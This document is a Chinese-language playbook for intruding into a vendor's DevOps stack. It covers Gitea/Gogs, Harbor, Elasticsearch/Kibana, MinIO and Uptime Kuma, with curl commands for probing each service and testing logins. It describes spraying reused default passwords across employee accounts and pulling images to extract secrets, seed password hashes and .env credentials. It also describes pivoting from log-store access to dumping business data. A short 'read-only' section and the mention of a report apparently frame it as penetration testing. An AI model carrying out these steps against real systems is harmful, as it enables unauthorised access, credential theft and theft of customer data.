# 供应商运维栈逐门作业：探测判据 / 只读产出 / 拿到后第一件事

> 定调：这一栈属于**供应商/厂商**（不是客户业务站）。进去后的目标是**凭据与源码**，最终回到客户数据面。
> 全程只读：pull / `_search` / 浏览。写动作不做。

## 1. Gitea / Gogs（代码仓库）

```bash
curl -sk "https://git.<域名>/api/v1/version"                 # {"version":"1.27.2"}
curl -sk -o /dev/null -w '%{http_code}\n' "https://git.<域名>/user/login"
```
- **员工弱口令 = 团队默认口令复用**：小团队同一口令进多个员工号，且常与框架 seed 默认口令**同源**。
- 成功判据：`POST /user/login` → `303`（跳首页）；`200` + 错误文案 = 失败。别只看状态码，看是否 303/是否下发了 `i_like_gitea` cookie。
- 登录后只读产出：
  ```bash
  curl -sk -b cookie.txt "https://git.<域名>/api/v1/user/repos?limit=50"
  ```
  内部仓库清单、commit/issue、**已删除仓库的活动流痕迹**（组织能力/项目史）。
- ★ 目标是找**框架/模板仓库**（产品线通用），不是这个客户的业务码——业务码对本目标没用，框架默认值对整条产品线有用。
- 拿到了仓库还能反推：`git log` 里的作者邮箱/昵称 → 员工清单 → 用同一口令试其它服务（ES/Harbor）。

## 2. Harbor / Registry（镜像仓库）

完整匿名拉取 + 解包 + 并发加速 + 对账坑见 `docker-image-extraction/references/harbor-anonymous-full-harvest.md`。要点：

```bash
curl -sk "https://hub.<域名>/api/v2.0/projects?page_size=100"   # 看 metadata.public
curl -sk "https://hub.<域名>/api/v2.0/search?q="               # ★ 常漏出更多项目，与上面取并集
curl -sk "https://hub.<域名>/service/token?service=harbor-registry&scope=repository:<proj>/<repo>:pull"
curl -sk -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' \
  -H "Authorization: Bearer <T>" "https://hub.<域名>/v2/<proj>/<repo>/manifests/<tag>"
```
- 镜像内**必查（部署态配置）**：
  ```
  app/*.json          → AdmSettings.json / appsettings*.json / NetAdminSettings.json
  app/SeedData/*.json → 默认账号 + 口令哈希
  .env*               → DB/Redis/MinIO/JWT
  *.pdb               → .NET 调试符号，产品线可完整反编译（高危）
  **/vendor/*/.git/   → 内嵌 git 仓库，git bundle 可导全部提交史 + remote.origin.url 暴露内网 GitLab
  ```
- 发布带 `.pdb` 说明厂商未做发布剥离 ⇒ 报告里单独列为厂商侧缺陷。

## 3. Elasticsearch / Kibana（日志库）

```bash
ES=https://es.<域名>
curl -sk -o /dev/null -w '%{http_code}\n' "$ES/"          # 401 + security_exception = 有鉴权 → 去凭据面找 elastic 口令
curl -sk -u "$U:$P" "$ES/_cluster/health?pretty"
curl -sk -u "$U:$P" "$ES/_cat/indices?v&h=index,docs.count,store.size&s=store.size:desc"
curl -sk -u "$U:$P" "$ES/_cat/aliases?v"                  # ILM rollover 后的真索引名
curl -sk -u "$U:$P" "https://kb.<域名>/api/status"        # Kibana 常与 ES 同口令
```
- **拿到 ES ≠ 结案**。日志索引常含全量请求/响应体 ⇒ 立刻转 `logstore-dump.md` 拖业务数据。
- Kibana 的价值不是"能进"，是用 Discover / Stack Management **确认索引名与字段名**，省掉猜字段的时间。

## 4. MinIO / S3 兼容对象存储

```bash
curl -sk "https://oss.<域名>/minio/health/live"      # 200 = 服务在
curl -sk "https://oss.<域名>/minio/health/ready"
curl -sk "https://oss.<域名>/<bucket>/?list-type=2"  # 桶匿名可列时直接吐 XML
```
- S3 网关常以 XML 错误体自述：`<Code>AccessDenied</Code><Region>us-west</Region>` → 反推 region 与 bucket 名。
- 桶里找：业务导出物（CSV/ZIP）、备份、静态资源包。**先列桶、再决定下不下大对象**。
- 拿到 AK/SK → 只读动作验证（列桶 / 取一个对象）后定范围，别一上来全量下载。

## 5. Uptime Kuma / 监控 / 自研服务

- Uptime Kuma 登录页与状态页会暴露**监测对象清单**（主机名/端口）与**时区**（运营者所在地，溯源情报）。
- 自研 IP 归属服务（QQWry 类）只回答 IP 归属：用来判定内网网段性质，**不是攻击面**，别投入。
- 监控栈的另一个用途：`/api/status-page` 常匿名可读 → 拿到内网资产清单后再回到 vhost/端口枚举。

## 6. 只读红线（照写进报告）

- 可做：pull 镜像、`_search`/`_scroll`、浏览页面、列桶。
- **不做**：push 镜像 / 改仓库 / 建账号 / 改配置 / 调运维接口（`/probe/exit|offline` 等）/ 改口令。只记录「可调用未调用」。
- 每一次访问都写进目标自己的日志/审计 —— 记录时间窗与命中索引，报告里说明足迹。
